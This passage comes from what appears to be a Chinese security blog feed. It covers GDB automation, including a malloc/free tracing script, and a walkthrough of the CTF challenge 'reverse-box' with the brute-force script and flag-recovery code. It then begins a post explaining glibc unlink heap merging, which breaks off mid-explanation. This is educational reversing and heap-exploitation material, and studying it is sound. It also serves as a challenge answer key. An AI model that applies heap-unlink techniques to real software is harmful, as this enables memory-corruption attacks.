class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># /tmp/malloc_free</span><br><span class="line"># 设置输出不要分屏</span><br><span class="line">set pagination off</span><br><span class="line">b my_malloc</span><br><span class="line">comm</span><br><span class="line">silent</span><br><span class="line">printf &quot;malloc 0x%x %lu\n&quot;, p, size</span><br><span class="line">bt</span><br><span class="line">c</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">b my_free</span><br><span class="line">comm</span><br><span class="line">silent</span><br><span class="line">printf &quot;free 0x%x\n&quot;, p</span><br><span class="line">bt</span><br><span class="line">c</span><br><span class="line">end</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>直接让gdb执行它：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gdb -q -p $(pidof $your_project) -x /tmp/malloc_free &gt; log</span><br></pre></td></tr></table></figure><p>运行一段时间后kill掉gdb，打开log看看里面的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ less log</span><br><span class="line">Attaching to process 8738</span><br><span class="line">Reading symbols from ...done.</span><br><span class="line">Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...Reading symbols from /usr/</span><br><span class="line">lib/debug//lib/x86_64-linux-gnu/libc-2.19.so...done.</span><br><span class="line">done.</span><br><span class="line">Loaded symbols for /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">......</span><br><span class="line">malloc 0x0 82</span><br><span class="line">#0  my_malloc (p=0x0, size=82) at memory.cpp:8</span><br><span class="line">#1  0x0000000000400657 in write_buffer (p=0x0, size=82) at memory.cpp:17</span><br><span class="line">#2  0x00000000004006b6 in main () at memory.cpp:25</span><br><span class="line">malloc 0x852c39c0 13</span><br><span class="line">#0  my_malloc (p=0x7ffd852c39c0 &quot;\001&quot;, size=13) at memory.cpp:8</span><br><span class="line">#1  0x0000000000400657 in write_buffer (p=0x7ffd852c39c0 &quot;\001&quot;, size=13) at memory.cpp:17</span><br><span class="line">#2  0x00000000004006b6 in main () at memory.cpp:25</span><br><span class="line">free 0x400780</span><br><span class="line">#0  my_free (p=0x400780 &lt;__libc_csu_init&gt; &quot;AWA\211\377AVI\211\366AUI\211\325ATL\215%x\006 &quot;) at memory.cpp:14</span><br><span class="line">#1  0x0000000000400632 in read_buffer (p=0x400780 &lt;__libc_csu_init&gt; &quot;AWA\211\377AVI\211\366AUI\211\325ATL\215%x\006 &quot;) at memory.cpp:16</span><br><span class="line">#2  0x00000000004006fe in main () at memory.cpp:28</span><br><span class="line">free 0x0</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>现在我们可以写个脚本对下帐。每次解析到<code>malloc</code>时，在对应指针的名下记下一项借出。解析到<code>free</code>时，表示销掉对应最近一次借出的还款。把全部输出解析完后，困扰已久的坏账情况就将水落石出，欠钱不还的老赖也将无可遁形。这种“拖网法”真的是简单粗暴又有效</p><p>我们还可以用这种“拖网法”获取指定函数的调用者比例、调用参数的分布范围等等。注意，不要在生产环境撒网，毕竟这么做对性能有显著影响。而且要做统计的话，也有更好的方法可以选</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>题目：reverse-box</p><p>来源：mma-ctf-2nd-2016</p><ul><li><h4 id="IDA分析代码"><a href="#IDA分析代码" class="headerlink" title="IDA分析代码"></a>IDA分析代码</h4></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2)</span> <span class="comment">//a2即为二维数组</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+18h] [ebp-10Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-108h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+11Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"usage: %s flag\n"</span>, *a2);<span class="comment">//a2[0]存输入的数据</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_804858D(&amp;v4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a2[<span class="number">1</span>]); ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%02x"</span>, *((<span class="keyword">unsigned</span> __int8 *)&amp;v4 + a2[<span class="number">1</span>][i]));</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现关键功能函数<strong>sub_804858D</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_804858D</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// ST1B_1</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v7; <span class="comment">// [esp+1Ah] [ebp-Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+1Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+1Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v1);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    v10 = (<span class="keyword">unsigned</span> __int8)rand();</span><br><span class="line">  <span class="keyword">while</span> ( !v10 );</span><br><span class="line">  *a1 = v10;</span><br><span class="line">  v7 = <span class="number">1</span>;</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = v7 ^ <span class="number">2</span> * v7;</span><br><span class="line">    <span class="keyword">if</span> ( (v7 &amp; <span class="number">0x80</span>u) == <span class="number">0</span> )</span><br><span class="line">      v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = <span class="number">27</span>;</span><br><span class="line">    v7 = v2 ^ v3;</span><br><span class="line">    v4 = <span class="number">4</span> * (<span class="number">2</span> * v8 ^ v8) ^ <span class="number">2</span> * v8 ^ v8;</span><br><span class="line">    v9 = <span class="number">16</span> * v4 ^ v4;</span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> )</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v5 = <span class="number">9</span>;</span><br><span class="line">    v8 = v9 ^ v5;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> __int8)__ROR1__(v8, <span class="number">4</span>) ^ (<span class="keyword">unsigned</span> __int8)__ROR1__(v8, <span class="number">5</span>) ^ (<span class="keyword">unsigned</span> __int8)__ROR1__(v8, <span class="number">6</span>) ^ (<span class="keyword">unsigned</span> __int8)__ROR1__(v8, <span class="number">7</span>) ^ (<span class="keyword">unsigned</span> __int8)(v8 ^ *a1);</span><br><span class="line">    a1[v7] = result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v7 != <span class="number">1</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根绝srand、rand、time函数大概可以猜测即为生成一张随机数表，就可以使用GDB脚本爆出盒子</p><ul><li>注意看此函数的汇编代码，在取随机数种子的位置：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:080485A7                 call    _rand</span><br><span class="line">.text:080485AC                 and     eax, 0FFh</span><br><span class="line">.text:080485B1                 mov     [ebp+var_C], eax</span><br></pre></td></tr></table></figure><ul><li>程序的流程很简单，就是先以时间做种子，取随机数生成一张表，然后输入作为表的索引，输出对应表中的十六进制数据</li><li>题目给出的目标输出为：<strong>95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a</strong></li><li>实际上就是要求输入是多少</li></ul><p>下面是GDB脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> $i=<span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> $total=<span class="number">256</span></span><br><span class="line"><span class="keyword">while</span>($i&lt;$total)</span><br><span class="line">　　b *<span class="number">0x080485B1</span>#mov     [ebp+var_C], eax 即程序取随机函数后的地址 方便修改种子数</span><br><span class="line">　　b *<span class="number">0x8048704</span> #movzx   eax, al，即程序最终结果的地址</span><br><span class="line">　　run T#开始跑程序</span><br><span class="line">　　<span class="built_in">set</span> $eax=$i #使得种子数等于爆破值i</span><br><span class="line">　　<span class="built_in">set</span> $i=$i+<span class="number">1</span> #i=i+<span class="number">1</span></span><br><span class="line">　　<span class="keyword">continue</span> #使得程序继续调试</span><br><span class="line">　　<span class="keyword">if</span> ($eax==<span class="number">0x95</span>) #当等于正确答案时打印表</span><br><span class="line">　　　　print $i, $i#打印出正确的种子数</span><br><span class="line">　　　　x/<span class="number">256</span>xb $esp+<span class="number">0x1c</span> #打印盒子表</span><br><span class="line">　　　　<span class="built_in">set</span> $i=<span class="number">256</span>#使得i=<span class="number">256</span>退出循环</span><br><span class="line">　　end</span><br><span class="line">　　stop</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>跑出来的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$1 = 215</span><br><span class="line">0xffffcf6c:0xd60xc90xc20xce0x470xde0xda0x70</span><br><span class="line">0xffffcf74:0x850xb40xd20x9e0x4b0x620x1e0xc3</span><br><span class="line">0xffffcf7c:0x7f0x370x7c0xc80x4f0xec0xf20x45</span><br><span class="line">0xffffcf84:0x180x610x170x1a0x290x110xc70x75</span><br><span class="line">0xffffcf8c:0x020x480x260x930x830x8a0x420x79</span><br><span class="line">0xffffcf94:0x810x100x500x440xc40x6d0x840xa0</span><br><span class="line">0xffffcf9c:0xb10x720x960x760xad0x230xb00x2f</span><br><span class="line">0xffffcfa4:0xb20xa70x350x570x5e0x920x070xc0</span><br><span class="line">0xffffcfac:0xbc0x360x990xaf0xae0xdb0xef0x15</span><br><span class="line">0xffffcfb4:0xe70x8e0x630x060x9c0x560x9a0x31</span><br><span class="line">0xffffcfbc:0xe60x640xb50x580x950x490x040xee</span><br><span class="line">0xffffcfc4:0xdf0x7e0x0b0x8c0xff0xf90xed0x7a</span><br><span class="line">0xffffcfcc:0x650x5a0x1f0x4e0xf60xf80x860x30</span><br><span class="line">0xffffcfd4:0xf00x4c0xb70xca0xe50x890x2a0x1d</span><br><span class="line">0xffffcfdc:0xe40x160xf50x3a0x270x280x8d0x40</span><br><span class="line">0xffffcfe4:0x090x030x6f0x940xa50x4a0x460x67</span><br><span class="line">0xffffcfec:0x780xb90xa60x590xea0x220xf10xa2</span><br><span class="line">0xffffcff4:0x710x120xcb0x880xd10xe80xac0xc6</span><br><span class="line">0xffffcffc:0xd50x340xfa0x690x970x9f0x250x3d</span><br><span class="line">0xffffd004:0xf30x5b0x0d0xa10x6b0xeb0xbe0x6e</span><br><span class="line">0xffffd00c:0x550x870x8f0xbf0xfc0xb30x910xe9</span><br><span class="line">0xffffd014:0x770x660x190xd70x240x200x510xcc</span><br><span class="line">0xffffd01c:0x520x7d0x820xd80x380x600xfb0x1c</span><br><span class="line">0xffffd024:0xd90xe30x410x5f0xd00xcf0x1b0xbd</span><br><span class="line">0xffffd02c:0x0f0xcd0x900x9b0xa90x130x010x73</span><br><span class="line">0xffffd034:0x5d0x680xc10xaa0xfe0x080x3e0x3f</span><br><span class="line">0xffffd03c:0xc50x8b0x000xd30xfd0xb60x430xbb</span><br><span class="line">0xffffd044:0xd40x800xe20x0c0x330x740xa80x2b</span><br><span class="line">0xffffd04c:0x540x4d0x2d0xa40xdc0x6c0x3b0x21</span><br><span class="line">0xffffd054:0x2e0xab0x320x5c0x7b0xe00x9d0x6a</span><br><span class="line">0xffffd05c:0x390x140x3c0xb80x0a0x530xf70xdd</span><br><span class="line">0xffffd064:0xf40x2c0x980xba0x050xe10x0e0xa3</span><br></pre></td></tr></table></figure><p>最后的解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">correct=<span class="string">'95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a'</span></span><br><span class="line">box=[\</span><br><span class="line"><span class="number">0xd6</span>,<span class="number">0xc9</span>,<span class="number">0xc2</span>,<span class="number">0xce</span>,<span class="number">0x47</span>,<span class="number">0xde</span>,<span class="number">0xda</span>,<span class="number">0x70</span>,\</span><br><span class="line"><span class="number">0x85</span>,<span class="number">0xb4</span>,<span class="number">0xd2</span>,<span class="number">0x9e</span>,<span class="number">0x4b</span>,<span class="number">0x62</span>,<span class="number">0x1e</span>,<span class="number">0xc3</span>,\</span><br><span class="line"><span class="number">0x7f</span>,<span class="number">0x37</span>,<span class="number">0x7c</span>,<span class="number">0xc8</span>,<span class="number">0x4f</span>,<span class="number">0xec</span>,<span class="number">0xf2</span>,<span class="number">0x45</span>,\</span><br><span class="line"><span class="number">0x18</span>,<span class="number">0x61</span>,<span class="number">0x17</span>,<span class="number">0x1a</span>,<span class="number">0x29</span>,<span class="number">0x11</span>,<span class="number">0xc7</span>,<span class="number">0x75</span>,\</span><br><span class="line"><span class="number">0x02</span>,<span class="number">0x48</span>,<span class="number">0x26</span>,<span class="number">0x93</span>,<span class="number">0x83</span>,<span class="number">0x8a</span>,<span class="number">0x42</span>,<span class="number">0x79</span>,\</span><br><span class="line"><span class="number">0x81</span>,<span class="number">0x10</span>,<span class="number">0x50</span>,<span class="number">0x44</span>,<span class="number">0xc4</span>,<span class="number">0x6d</span>,<span class="number">0x84</span>,<span class="number">0xa0</span>,\</span><br><span class="line"><span class="number">0xb1</span>,<span class="number">0x72</span>,<span class="number">0x96</span>,<span class="number">0x76</span>,<span class="number">0xad</span>,<span class="number">0x23</span>,<span class="number">0xb0</span>,<span class="number">0x2f</span>,\</span><br><span class="line"><span class="number">0xb2</span>,<span class="number">0xa7</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0x5e</span>,<span class="number">0x92</span>,<span class="number">0x07</span>,<span class="number">0xc0</span>,\</span><br><span class="line"><span class="number">0xbc</span>,<span class="number">0x36</span>,<span class="number">0x99</span>,<span class="number">0xaf</span>,<span class="number">0xae</span>,<span class="number">0xdb</span>,<span class="number">0xef</span>,<span class="number">0x15</span>,\</span><br><span class="line"><span class="number">0xe7</span>,<span class="number">0x8e</span>,<span class="number">0x63</span>,<span class="number">0x06</span>,<span class="number">0x9c</span>,<span class="number">0x56</span>,<span class="number">0x9a</span>,<span class="number">0x31</span>,\</span><br><span class="line"><span class="number">0xe6</span>,<span class="number">0x64</span>,<span class="number">0xb5</span>,<span class="number">0x58</span>,<span class="number">0x95</span>,<span class="number">0x49</span>,<span class="number">0x04</span>,<span class="number">0xee</span>,\</span><br><span class="line"><span class="number">0xdf</span>,<span class="number">0x7e</span>,<span class="number">0x0b</span>,<span class="number">0x8c</span>,<span class="number">0xff</span>,<span class="number">0xf9</span>,<span class="number">0xed</span>,<span class="number">0x7a</span>,\</span><br><span class="line"><span class="number">0x65</span>,<span class="number">0x5a</span>,<span class="number">0x1f</span>,<span class="number">0x4e</span>,<span class="number">0xf6</span>,<span class="number">0xf8</span>,<span class="number">0x86</span>,<span class="number">0x30</span>,\</span><br><span class="line"><span class="number">0xf0</span>,<span class="number">0x4c</span>,<span class="number">0xb7</span>,<span class="number">0xca</span>,<span class="number">0xe5</span>,<span class="number">0x89</span>,<span class="number">0x2a</span>,<span class="number">0x1d</span>,\</span><br><span class="line"><span class="number">0xe4</span>,<span class="number">0x16</span>,<span class="number">0xf5</span>,<span class="number">0x3a</span>,<span class="number">0x27</span>,<span class="number">0x28</span>,<span class="number">0x8d</span>,<span class="number">0x40</span>,\</span><br><span class="line"><span class="number">0x09</span>,<span class="number">0x03</span>,<span class="number">0x6f</span>,<span class="number">0x94</span>,<span class="number">0xa5</span>,<span class="number">0x4a</span>,<span class="number">0x46</span>,<span class="number">0x67</span>,\</span><br><span class="line"><span class="number">0x78</span>,<span class="number">0xb9</span>,<span class="number">0xa6</span>,<span class="number">0x59</span>,<span class="number">0xea</span>,<span class="number">0x22</span>,<span class="number">0xf1</span>,<span class="number">0xa2</span>,\</span><br><span class="line"><span class="number">0x71</span>,<span class="number">0x12</span>,<span class="number">0xcb</span>,<span class="number">0x88</span>,<span class="number">0xd1</span>,<span class="number">0xe8</span>,<span class="number">0xac</span>,<span class="number">0xc6</span>,\</span><br><span class="line"><span class="number">0xd5</span>,<span class="number">0x34</span>,<span class="number">0xfa</span>,<span class="number">0x69</span>,<span class="number">0x97</span>,<span class="number">0x9f</span>,<span class="number">0x25</span>,<span class="number">0x3d</span>,\</span><br><span class="line"><span class="number">0xf3</span>,<span class="number">0x5b</span>,<span class="number">0x0d</span>,<span class="number">0xa1</span>,<span class="number">0x6b</span>,<span class="number">0xeb</span>,<span class="number">0xbe</span>,<span class="number">0x6e</span>,\</span><br><span class="line"><span class="number">0x55</span>,<span class="number">0x87</span>,<span class="number">0x8f</span>,<span class="number">0xbf</span>,<span class="number">0xfc</span>,<span class="number">0xb3</span>,<span class="number">0x91</span>,<span class="number">0xe9</span>,\</span><br><span class="line"><span class="number">0x77</span>,<span class="number">0x66</span>,<span class="number">0x19</span>,<span class="number">0xd7</span>,<span class="number">0x24</span>,<span class="number">0x20</span>,<span class="number">0x51</span>,<span class="number">0xcc</span>,\</span><br><span class="line"><span class="number">0x52</span>,<span class="number">0x7d</span>,<span class="number">0x82</span>,<span class="number">0xd8</span>,<span class="number">0x38</span>,<span class="number">0x60</span>,<span class="number">0xfb</span>,<span class="number">0x1c</span>,\</span><br><span class="line"><span class="number">0xd9</span>,<span class="number">0xe3</span>,<span class="number">0x41</span>,<span class="number">0x5f</span>,<span class="number">0xd0</span>,<span class="number">0xcf</span>,<span class="number">0x1b</span>,<span class="number">0xbd</span>,\</span><br><span class="line"><span class="number">0x0f</span>,<span class="number">0xcd</span>,<span class="number">0x90</span>,<span class="number">0x9b</span>,<span class="number">0xa9</span>,<span class="number">0x13</span>,<span class="number">0x01</span>,<span class="number">0x73</span>,\</span><br><span class="line"><span class="number">0x5d</span>,<span class="number">0x68</span>,<span class="number">0xc1</span>,<span class="number">0xaa</span>,<span class="number">0xfe</span>,<span class="number">0x08</span>,<span class="number">0x3e</span>,<span class="number">0x3f</span>,\</span><br><span class="line"><span class="number">0xc5</span>,<span class="number">0x8b</span>,<span class="number">0x00</span>,<span class="number">0xd3</span>,<span class="number">0xfd</span>,<span class="number">0xb6</span>,<span class="number">0x43</span>,<span class="number">0xbb</span>,\</span><br><span class="line"><span class="number">0xd4</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0x0c</span>,<span class="number">0x33</span>,<span class="number">0x74</span>,<span class="number">0xa8</span>,<span class="number">0x2b</span>,\</span><br><span class="line"><span class="number">0x54</span>,<span class="number">0x4d</span>,<span class="number">0x2d</span>,<span class="number">0xa4</span>,<span class="number">0xdc</span>,<span class="number">0x6c</span>,<span class="number">0x3b</span>,<span class="number">0x21</span>,\</span><br><span class="line"><span class="number">0x2e</span>,<span class="number">0xab</span>,<span class="number">0x32</span>,<span class="number">0x5c</span>,<span class="number">0x7b</span>,<span class="number">0xe0</span>,<span class="number">0x9d</span>,<span class="number">0x6a</span>,\</span><br><span class="line"><span class="number">0x39</span>,<span class="number">0x14</span>,<span class="number">0x3c</span>,<span class="number">0xb8</span>,<span class="number">0x0a</span>,<span class="number">0x53</span>,<span class="number">0xf7</span>,<span class="number">0xdd</span>,\</span><br><span class="line"><span class="number">0xf4</span>,<span class="number">0x2c</span>,<span class="number">0x98</span>,<span class="number">0xba</span>,<span class="number">0x05</span>,<span class="number">0xe1</span>,<span class="number">0x0e</span>,<span class="number">0xa3</span>\</span><br><span class="line">]</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(correct)//<span class="number">2</span>):</span><br><span class="line">    idx=box.index(int(correct[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">    flag+=chr(idx)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>【1】<a href="https://segmentfault.com/a/1190000005367875" target="_blank" rel="noopener">GDB 自动化操作的技术</a></p><p>【2】<a href="https://segmentfault.com/a/1190000005718889" target="_blank" rel="noopener">用 Python 拓展 GDB（一）</a></p><p>【3】<a href="https://nettee.github.io/posts/2018/GDB-automated-debugging/" target="_blank" rel="noopener">GDB 自动化调试</a></p><p>【4】<a href="https://sourceware.org/gdb/current/onlinedocs/gdb/" target="_blank" rel="noopener">GDB User Manual</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>详解UnLink</title>
      <link href="/2019/11/23/%E2%95%A7%CE%A9%E2%95%9C%CE%93UnLink/"/>
      <url>/2019/11/23/%E2%95%A7%CE%A9%E2%95%9C%CE%93UnLink/</url>
      
        <content type="html"><![CDATA[<h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>首先我们先说一下为什么会合并 chunk，这是为了避免 heap 中有太多零零碎碎的内存块，合并之后可以用来应对更大的内存块请求。合并的主要顺序为</p><ul><li>先考虑物理低地址空闲块</li><li>后考虑物理高地址空闲块</li></ul><p>且 只有不是 fast bin 的情况下才会触发 unlink ，本人感觉CTF Wiki上很多东西讲的不是很清楚，故自己写了</p><p>首先又是这张经典的图</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E8%AF%A6%E8%A7%A3UnLink/unlink_smallbin_intro.png" alt></p><p>这张图，至少那时候我看得很迷糊，主要是unlink的时候到底那个是P，哪个是BK，哪个是FD，物理内存上到底又是什么样子的，就很迷糊，所以我觉得好好研究研究</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E8%AF%A6%E8%A7%A3UnLink/old_unlink_vul.png" alt></p><p>又是这经典的图作为例子，还是很迷糊，于是我决定换个形式描述这张图，首先是一个<strong>chunk</strong>在内存中的真实布局</p><table><thead><tr><th align="center">Low Address</th><th align="center">Prev_size</th></tr></thead><tbody><tr><td align="center"></td><td align="center"><strong>Size</strong></td></tr><tr><td align="center"></td><td align="center"><strong>fd</strong></td></tr><tr><td align="center"></td><td align="center"><strong>bk</strong></td></tr><tr><td align="center"><strong>High Address</strong></td><td align="center"><strong>Content</strong></td></tr></tbody></table><p>所以上面那张图在内存中的布局应该是</p><table><thead><tr><th align="center">Low Address</th><th align="center">Prev_size</th><th align="center"><strong>Q</strong></th></tr></thead><tbody><tr><td align="center"></td><td align="center"><strong>Size=0x81</strong></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"><strong>User Content</strong></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"><strong>Prev_Size</strong></td><td align="center"><strong>NextChunk</strong></td></tr><tr><td align="center"></td><td align="center"><strong>Size=0x80</strong></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"><strong>fd</strong></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"><strong>bk</strong></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"><strong>Unuser Data</strong></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"><strong>Prev_size</strong></td><td align="center"><strong>NextChunk of NextChunk</strong></td></tr><tr><td align="center"></td><td align="center"><strong>Size=0x80</strong></td><td align="center"></td></tr><tr><td align="center"><strong>High Address</strong></td><td align="center"><strong>User Content</strong></td><td align="center"></td></tr></tbody></table><p> 其中 <strong>Q</strong> 处于使用状态、<strong>Nextchunk</strong> 处于释放状态 , 当我们 <strong>free(Q)</strong>  </p><ul><li><strong>glibc</strong> 判断这个块是 <strong>small chunk</strong></li><li>先考虑物理低地址空闲块，判断前向合并，发现前一个 <strong>chunk</strong> 处于使用状态，不需要前向合并</li><li>后考虑物理高地址空闲块，判断后向合并，发现后一个 <strong>chunk</strong> 处于空闲状态，需要合并</li><li>继而对 <strong>Nextchunk</strong> 采取 <strong>unlink</strong> 